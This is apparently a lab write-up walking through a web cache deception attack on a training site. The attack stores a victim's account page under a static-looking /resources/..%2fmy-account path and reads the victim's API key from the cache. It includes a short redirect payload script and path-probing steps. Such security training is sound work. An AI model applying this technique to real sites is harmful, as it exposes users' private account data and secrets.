# Lab 4 — Exploiting cache server normalization for web cache deception

> [← Back to Web Cache Deception](../README.md)

---

## 🎯 Objective
Exploit normalization happening on the **cache server** (not the origin) to store a cached copy of Carlos's account page and steal his API key.

---

## 🪜 Steps

### Step 1 — Login to wiener account
Credentials: `wiener:peter`

> 📸 Add screenshot here

---

### Step 2 — Intercept and send to Repeater
Capture `GET /my-account` → send to **Repeater**.

> 📸 Add screenshot here

---

### Step 3 — Test path handling
- `/my-account/abc` → **404**
- `/my-accountabc` → **404**

> 📸 Add screenshot here

---

### Step 4 — Test delimiters (Intruder Sniper)
Place payload after `/my-account`, use delimiter list, uncheck URL-encode.

Find which delimiter returns 200 OK.

> 📸 Add screenshot here

---

### Step 5 — Investigate normalization discrepancies
Test: `/aaa/..%2fmy-account`

If the **cache** resolves this (not the origin), the cache will normalize the path to `/my-account` before deciding what to cache.

> 📸 Add screenshot here

---

### Step 6 — Find static resource path
Identify what path prefix the cache stores (e.g. `/resources/`):
- `/resources/test` → 1st: miss, 2nd: hit ✅

> 📸 Add screenshot here

---

### Step 7 — Add an encoded dot-segment after `/resources`
Try: `GET /resources/..%2fmy-account`

The cache normalizes this to `/my-account` when deciding to store it under `/resources/`, but the origin serves the `/my-account` page content.

- 1st: miss → 2nd: hit ✅

> 📸 Add screenshot here

---

### Step 8 — Deliver exploit
On exploit server:

```html
<script>
  document.location="https://YOUR-LAB-ID.web-security-academy.net/resources/..%2fmy-account?wcd"
</script>
```

Store and deliver to victim.

> 📸 Add screenshot here

---

### Step 9 — Get Carlos's API key
Request the same URL in Repeater. Cached response contains **Carlos's API key**.

Submit to solve the lab.

> 📸 Add screenshot here

---

## ✅ Result
Lab solved!

---

## 💡 Key Takeaway
Cache-side normalization is the mirror of origin-side — when the cache resolves encoded dot-segments before matching cache rules, attackers can poison the cache with sensitive content under static-looking paths.
